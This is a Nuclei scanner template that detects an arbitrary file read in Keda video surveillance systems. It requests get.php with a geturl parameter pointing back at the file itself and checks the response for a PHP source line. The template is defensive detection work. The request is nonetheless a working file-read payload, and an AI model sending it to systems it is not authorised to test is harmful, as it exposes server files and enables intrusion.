id: keda-arbitrary-file-read
info:
  name: Keda Video Surveillance Arbitrary File Read
  author: ProjectDiscoveryAI
  severity: high
  tags: file-read,keda
http:
  - method: GET
    path:
      - "{{BaseURL}}/get.php?geturl=get.php"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - "$pararl = $_GET['geturl'];"
